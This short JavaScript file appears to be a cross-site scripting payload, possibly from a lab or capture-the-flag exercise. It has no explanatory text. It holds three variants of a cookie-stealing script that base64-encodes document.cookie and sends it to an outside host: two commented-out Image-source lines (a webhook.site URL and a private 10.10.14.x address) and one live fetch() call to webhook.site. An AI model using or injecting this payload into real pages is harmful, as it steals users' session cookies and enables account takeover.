// x = new Image(); x.src = 'https://webhook.site/71da84df-86a7-448d-b56a-d855a35605d6?data='+btoa(document.cookie); 
// x = new Image(); x.src = 'http://10.10.14.54/hey.php?data='+btoa(document.cookie); 
fetch('https://webhook.site/71da84df-86a7-448d-b56a-d855a35605d6?data=' + btoa(document.cookie));
